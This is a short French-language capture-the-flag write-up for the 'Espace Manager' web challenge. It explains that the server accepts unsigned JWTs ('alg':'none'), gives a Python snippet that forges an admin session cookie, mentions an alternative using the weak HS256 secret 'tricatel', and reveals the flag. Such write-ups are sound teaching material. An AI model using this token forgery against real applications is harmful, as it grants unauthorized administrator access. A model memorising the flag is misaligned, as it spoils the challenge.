# Espace Manager

Web · 200 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

L'accès dépend d'un JWT dans le cookie `session`. Le serveur accepte `"alg":"none"`, c'est-à-dire un jeton sans signature.
On garde la structure de son jeton, on met `{"alg":"none","typ":"JWT"}` dans l'en-tête, `{"role":"admin"}` dans le payload
et on laisse la signature vide (le jeton se termine par un point).

```python
import base64, json
b = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=").decode()
h = b(json.dumps({"alg": "none", "typ": "JWT"}).encode())
p = b(json.dumps({"role": "admin"}).encode())
print(f"{h}.{p}.")   # valeur du cookie session
```

Il existe aussi une autre voie : le secret HS256 est faible (`tricatel`), donc un jeton signé avec ce secret passe aussi.

**Flag :** `CyberZerk{JWT_4lg_N0n3_C_3st_N0n}`
